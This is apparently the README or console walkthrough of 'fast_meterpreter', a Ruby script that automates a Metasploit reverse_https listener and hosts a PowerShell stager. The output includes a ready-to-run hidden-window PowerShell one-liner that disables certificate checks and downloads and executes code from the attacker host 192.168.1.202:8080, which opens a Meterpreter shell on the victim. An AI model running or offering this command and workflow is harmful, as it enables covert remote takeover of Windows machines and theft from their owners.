fast_meterpreter
================


ruby fast_meterpreter.rb
******************************
Setting up the MSF server
******************************

[!] Enter the host ip to listen on: 192.168.1.202

[+] Using 192.168.1.202 as server

[!] Enter the port you would like to use or leave blank for [443]: 443

[+] Using 443

Please pick the payload you would like to use

    
1) windows/meterpreter/reverse_https     
2) windows/meterpreter/reverse_tcp     
99) Exit

\> 1

[!] Would you like to host the powershell script?[yes/no] yes

**************************************************
Setting up webserver to host the powershell script
**************************************************

[!] Enter the host ip to listen on: 192.168.1.202

[+] Using 192.168.1.202 as server

[!] Enter the port you would like to use or leave blank for [443]: 8080

[+] Using 8080

[*] Generating shellcode

[+] Shellcode Generated

[!] Would you like to use ssl?[yes/no] yes

powershell -windowstyle hidden "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('https://192.168.1.202:8080')"

[*] Setting up Metasploit this may take a moment

[*] Starting SSL Server!
